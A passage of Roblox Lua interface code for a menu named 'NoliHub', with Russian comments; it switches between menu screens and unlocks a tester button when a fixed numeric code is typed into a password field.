local script = G2L["b4"];
	local button = script.Parent
	
	local function leftClick()
	script.Parent.Parent.Parent.Screens.Main.Visible = true
	script.Parent.Parent.Parent.Screens.Player_modification.Visible = false
	script.Parent.Parent.Parent.Screens.TesterMenu.Visible = false
	end
	
	button.MouseButton1Click:Connect(leftClick)
end;
task.spawn(C_b4);
-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Selector.Tester.PasswordSystem
local function C_b7()
local script = G2L["b7"];
	-- Предполагаем, что у вас есть ScreenGui с именем "ScreenGui", содержащий TextButton и TextBox
	
	-- Получаем элементы GUI
	local textBox = script.Parent.Parent.PasswordField  -- Найти TextBox
	local textButton = script.Parent.Parent.TesterLock  -- Найти TextButton
	
	-- Устанавливаем начальные значения
	textBox.Visible = false  -- TextBox скрыт по умолчанию
	
		-- Функция для обработки нажатия на кнопку
		textButton.MouseButton1Click:Connect(function()
			textBox.Visible = not textBox.Visible  -- Переключаем видимость TextBox
		end)
	
		-- Функция для проверки значения в TextBox
		textBox.FocusLost:Connect(function(enterPressed)
			if enterPressed and textBox.Text == "2945969" then  -- Если текст равен "2945969"
				print("Меню тестировщика активно")
				textBox.Text = "Меню активно"
				wait(5)
				textBox.Visible = false
				script.Parent.Interactable = true
				textButton.Visible = false
				script:Destroy()
			else
				print("Код не найден в датабазе")
				textBox.Text = "Код не найден в датабазе"
		
			end
		end)
end;
task.spawn(C_b7);
